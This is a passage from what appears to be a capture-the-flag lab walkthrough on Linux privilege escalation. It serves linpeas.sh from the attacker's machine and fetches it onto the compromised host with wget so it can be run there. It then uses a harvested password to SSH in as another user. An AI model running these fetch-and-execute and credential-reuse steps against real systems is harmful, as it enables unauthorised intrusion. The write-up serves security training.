# Privilege escalation
We are now going to upload `linpeas.sh` to check if it can help us to find a way to escalate privileges.</br>
First start a python webserver on port 80.
```
python3 -m http.server 80
```
On www-data user in your machine, navigate to `tmp` directory and type
```
wget http://IP_of_your_machine:80/linpeas.sh
```
The script is now on the remote machine change its permission and execute it.

<img alt="" class="bg hc hd c" width="1000" height="450" loading="lazy" role="presentation" src="https://i.ibb.co/rQWqcWf/Academy-8.png"></img>

The output is as follows:

<img alt="" class="bg hc hd c" width="500" height="40" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:640/format:webp/0*1O5igU4EkNrx9N_0.png"></img>

It means that the `backup.sh` script is running every minute as root !<br/>
It also gives a password for grimmie user.</br>
We now switch to grimmie user using SSH protocol with the command:
```
ssh grimmie@<ip>
```
